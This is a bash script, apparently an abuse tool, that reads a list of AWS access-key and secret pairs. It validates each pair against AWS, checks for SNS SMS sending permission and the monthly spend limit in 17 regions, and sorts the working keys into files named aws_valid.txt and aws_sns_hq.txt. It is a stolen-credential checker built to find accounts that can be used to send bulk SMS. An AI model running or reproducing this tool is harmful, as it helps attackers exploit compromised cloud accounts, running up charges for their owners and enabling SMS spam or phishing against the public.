#!/bin/bash


check_send_quota() {
    export AWS_DEFAULT_REGION=$1
    aws sns get-sms-attributes > /dev/null 2>&1
    if [[ $? -eq 0 ]]; then
        quota=$(aws sns get-sms-attributes | jq '.attributes''.MonthlySpendLimit')
        echo -e "\e[33m[INFO]\e[39m Max quota one month send quota for ${AWS_DEFAULT_REGION}: $quota usd."| tr -d '"'
        echo -e "${AWS_ACCESS_KEY_ID}:${AWS_SECRET_ACCESS_KEY}:${AWS_DEFAULT_REGION} ($quota per month)" >> sns/aws_sns.txt
        quota2=$(echo -e "$quota" | tr -d '"')
        
        if [ $quota2 -ge 2 ]; then
            echo -e "\e[92m[OK]\e[39m SAVE SNS credentials..."
            output="$(echo -n "$i" | cut -d ':' -f1,2):${AWS_DEFAULT_REGION} [$quota2 USD/Monthly]"
            echo -e "$output" >> sns/aws_sns_hq.txt
            aws sesv2 get-account &>/dev/null
        fi
    fi
}

declare -a arr=("us-east-2" "us-east-1" "us-west-1" "us-west-2" "af-south-1" "ap-south-1" "ap-northeast-3" "ap-southeast-1" "ap-southeast-2" "ap-northeast-1" "ca-central-1" "eu-central-1" "eu-west-1" "eu-west-2" "eu-south-1" "eu-west-3" "eu-north-1")
for i in $(tac $1); do
    echo -e "\n"
    export AWS_ACCESS_KEY_ID=$(echo -n "$i" | cut -d':' -f1)
    export AWS_SECRET_ACCESS_KEY=$(echo -n "$i" | cut -d':' -f2)
    export AWS_DEFAULT_REGION="us-east-1"
    aws sts get-caller-identity > /dev/null 2>&1
    if [[ $? -eq 0 ]]; then
        echo -e "\e[92m[OK]\e[39m ${AWS_ACCESS_KEY_ID} is valid."
        echo "$i" >> smtp/aws_valid.txt
        echo -e "\e[33m[INFO]\e[39m checking for sns permissions..."
        aws sns get-sms-attributes > /dev/null 2>&1
        if [[ $? -eq 0 ]]; then
            echo -e "\e[92m[OK]\e[39m ${AWS_ACCESS_KEY_ID} has sns permissions ! :)"
            for region in "${arr[@]}"; do
                check_send_quota $region
            done
        else
            echo -e "\e[91m[ERROR]\e[39m ${AWS_ACCESS_KEY_ID} has not sns permissions. :("
        fi
    else
        echo -e "\e[91m[ERROR]\e[39m ${AWS_ACCESS_KEY_ID} is invalid."
    fi
done
